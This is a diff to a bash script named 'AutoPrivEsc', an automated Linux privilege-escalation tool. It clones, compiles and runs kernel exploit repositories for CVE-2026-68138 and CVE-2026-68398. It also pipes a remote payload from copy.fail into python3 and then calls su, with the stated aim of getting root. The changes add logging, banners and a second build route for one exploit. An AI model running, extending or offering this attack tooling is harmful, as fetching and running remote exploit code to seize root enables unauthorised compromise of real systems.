@@ -18,12 +18,15 @@ done
 
 # ===== BANNER =====
 echo -e "${RED}"
-echo "   _____ _  _   ___   _____  _____  _   ___ ___ ___"
-echo "  |_   _| || | / _ \ |_   _||__  / | | | __| _ \ __|"
-echo "    | | | || || (_) |  | |    / /  | |_| _||   / _| "
-echo "    |_| |_||_| \___/   |_|   /___|  \___/___|_|_\___|"
-echo "         AutoPrivEsc - Scan -> Match -> Exploit"
+echo "  ████████╗██╗  ██╗██╗███████╗ ██████╗██╗████████╗███████╗"
+echo "  ╚══██╔══╝██║  ██║██║██╔════╝██╔════╝██║╚══██╔══╝██╔════╝"
+echo "     ██║   ███████║██║███████╗██║     ██║   ██║   █████╗  "
+echo "     ██║   ██╔══██║██║╚════██║██║     ██║   ██║   ██╔══╝  "
+echo "     ██║   ██║  ██║██║███████║╚██████╗██║   ██║   ███████╗"
+echo "     ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝   ╚═╝   ╚══════╝"
 echo -e "${NC}"
+echo -e "${GREEN}   AutoPrivEsc  -  Scan -> Match -> Exploit${NC}"
+echo -e "${YELLOW}   -------------------------------------------------${NC}"
 echo -e "${YELLOW}[*] Scanning system...${NC}"
 echo ""
 
@@ -52,23 +55,37 @@ if [ "$(id -u)" = "0" ]; then
 fi
 
 # ===== HELPERS =====
+LOGFILE=/tmp/apex/exploit.log
+mkdir -p /tmp/apex
+: > $LOGFILE
+
 got_root() {
     echo -e "${RED}"
-    echo "  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"
-    echo "  ROOT GOT!"
-    echo "  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"
+    echo "  ██████╗  ██████╗  ██████╗ ████████╗     ██████╗  ██████╗ ████████╗ ██████╗ "
+    echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔═══██╗██╔═══██╗╚══██╔══╝██╔═══██╗"
+    echo "  ██████╔╝██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
+    echo "  ██╔══██╗██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
+    echo "  ██║  ██║╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝"
+    echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ "
     echo -e "${NC}"
+    echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)${NC}"
     id
     echo ""
-    echo -e "${GREEN}[+] Stopping. Clean up: rm -rf /tmp/apex${NC}"
+    echo -e "${GREEN}[+] ROOT! Stopping. Clean up: rm -rf /tmp/apex${NC}"
     exit 0
 }
 
 run() {
-    echo -e "${CYAN}[>] $1${NC}"
-    bash -c "$1" 2>/dev/null
+    echo -e "${CYAN}[>] Trying: $1${NC}"
+    echo "==== $1 ====" >> $LOGFILE
+    bash -c "$1" 2>&1 | tee -a $LOGFILE | sed 's/^/    /'
+    RC=${PIPESTATUS[0]}
     if [ "$(id -u)" = "0" ]; then
+        echo -e "${GREEN}[+] SUCCESS via: $1${NC}"
         got_root "$1"
+    else
+        echo -e "${YELLOW}[-] no root (exit code: $RC)${NC}"
+        echo ""
     fi
 }
 
@@ -191,8 +208,12 @@ echo -e "${YELLOW}[~] Trying CVE-2026-68138${NC}"
 run "git clone -q https://github.com/aramosf/CVE-2026-68138.git c68138 && cd c68138 && ./build.sh && ./build/exploit"
 
 # --- CVE-2026-68398 ---
-echo -e "${YELLOW}[~] Trying CVE-2026-68398${NC}"
+echo -e "${YELLOW}[~] Trying CVE-2026-68398 (gcc)${NC}"
 run "git clone -q https://github.com/aramosf/cve-2026-68398.git c68398 && cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit"
+
+# --- CVE-2026-68398 (make) ---
+echo -e "${YELLOW}[~] Trying CVE-2026-68398 (make)${NC}"
+run "git clone -q https://github.com/aramosf/cve-2026-68398.git c68398b && cd c68398b && make && ./build/CVE-2026-68398"
 
 # --- copy.fail exp ---
 echo -e "${YELLOW}[~] Trying copy.fail exp${NC}"
@@ -200,5 +221,12 @@ run "curl https://copy.fail/exp | python3 && su"
 
 # ===== RESULT =====
 echo "================================================"
-echo -e "${RED}[-] No exploit succeeded.${NC}"
-echo -e "${RED}[-] Done. Clean up: rm -rf /tmp/apex${NC}"
+if [ "$(id -u)" = "0" ]; then
+    echo -e "${GREEN}[+] ROOT GOT!${NC}"
+    id
+else
+    echo -e "${RED}[-] All exploits failed. No root obtained.${NC}"
+    echo -e "${RED}[-] Full log: $LOGFILE${NC}"
+    echo -e "${YELLOW}[-] Common causes: hardened kernel (grsec), missing SUID, noexec /tmp, patched kernel${NC}"
+    echo -e "${YELLOW}[-] Clean up: rm -rf /tmp/apex${NC}"
+fi
